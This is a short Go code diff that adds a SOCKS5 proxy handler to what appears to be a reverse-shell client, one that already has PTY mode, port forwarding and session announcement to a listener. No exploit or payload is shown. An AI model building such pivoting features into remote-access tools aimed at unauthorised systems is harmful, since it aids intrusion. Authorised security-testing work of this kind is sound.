@@ -39,6 +39,7 @@ type ReverseClient struct {
 	inPtyMode         bool       // Whether currently in PTY mode
 	ptyMutex          sync.Mutex // Protects PTY state
 	forwardHandler    *ForwardHandler // Port forwarding handler
+	socksHandler      *SocksHandler   // SOCKS5 proxy handler
 }
 
 var (
@@ -183,6 +184,14 @@ func (rc *ReverseClient) Connect() error {
 		}
 	})
 
+	// Initialize SOCKS handler with send function
+	rc.socksHandler = NewSocksHandler(func(msg string) {
+		if rc.writer != nil {
+			rc.writer.WriteString(msg)
+			rc.writer.Flush()
+		}
+	})
+
 	// Announce session identifier to listener and log it locally
 	id := GetSessionID()
 	log.Printf("Session ID: %s", id)
@@ -205,6 +214,9 @@ func (rc *ReverseClient) Close() error {
 	rc.isConnected = false
 	if rc.forwardHandler != nil {
 		rc.forwardHandler.Close()
+	}
+	if rc.socksHandler != nil {
+		rc.socksHandler.Close()
 	}
 	return rc.conn.Close()
 }
